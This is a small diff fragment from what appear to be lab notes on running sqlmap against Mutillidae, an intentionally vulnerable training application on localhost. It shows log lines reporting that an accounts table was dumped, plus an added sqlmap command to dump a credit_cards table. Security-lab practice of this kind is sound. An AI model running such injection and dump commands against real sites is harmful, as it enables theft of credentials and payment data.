@@ -137,7 +137,7 @@ Table: accounts
 [11:49:37] [INFO] table 'mutillidae.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/mutillidae/accounts.csv'
 [11:49:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
 
-
+##to penetrate the sql
 sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
 Y
 0
